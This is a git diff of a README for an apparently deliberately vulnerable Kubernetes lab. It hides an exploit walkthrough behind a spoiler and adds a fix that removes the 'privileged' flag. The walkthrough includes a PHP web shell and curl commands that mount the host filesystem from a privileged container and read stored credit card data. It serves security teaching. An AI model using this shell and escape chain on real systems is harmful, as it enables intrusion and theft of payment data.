@@ -21,16 +21,24 @@ Payments processing microservice. Completely protected ;).
 
 ## Exploit
 
-Your target is to steal users credit cards. Cards data is located in `payment` microservice (which has no security issues). But `web` microservice has an RCE vulnerability (and has `privileged`). This allows us to access any data in the cluster, including cards data.
+<details>
+  <summary>Spoiler alert</summary>
+    
+  Your target is to steal users credit cards. Cards data is located in `payment` microservice (which has no security issues). But `web` microservice has an RCE vulnerability (and has `privileged`). This allows us to access any data in the cluster, including cards data.
 
-1. Upload file `shell.php`:
-    ```php
-    <?php
-    echo '<pre>';
-    var_dump(system($_GET['cmd']));
-    echo '</pre>';
-    ```
-2. Create temporary directory for host file system `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mkdir%20/tmp/host`
-3. Mount host's file system (`sda1` in my case but could vary) `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mount%20/dev/sda1%20/tmp/host`
-4. Find file `cards.json` in hosts filesystem `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=find%20/tmp/host%20-name%20"cards.json"`
-5. Get stored cards `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=cat%20<👆>`
+  1. Upload file `shell.php`:
+      ```php
+      <?php
+      echo '<pre>';
+      var_dump(system($_GET['cmd']));
+      echo '</pre>';
+      ```
+  2. Create temporary directory for host file system `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mkdir%20/tmp/host`
+  3. Mount host's file system (`sda1` in my case but could vary) `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mount%20/dev/sda1%20/tmp/host`
+  4. Find file `cards.json` in hosts filesystem `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=find%20/tmp/host%20-name%20"cards.json"`
+  5. Get stored cards `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=cat%20<👆>`
+</details>
+
+## Fix
+
+To fix the problem you need to remove `privileged` flag from [web/deployment.yaml](web/deployment.yaml#L27-L28). It will not help to protect `web` microservice but prevent steeling of credit cards from `payment` microservice.
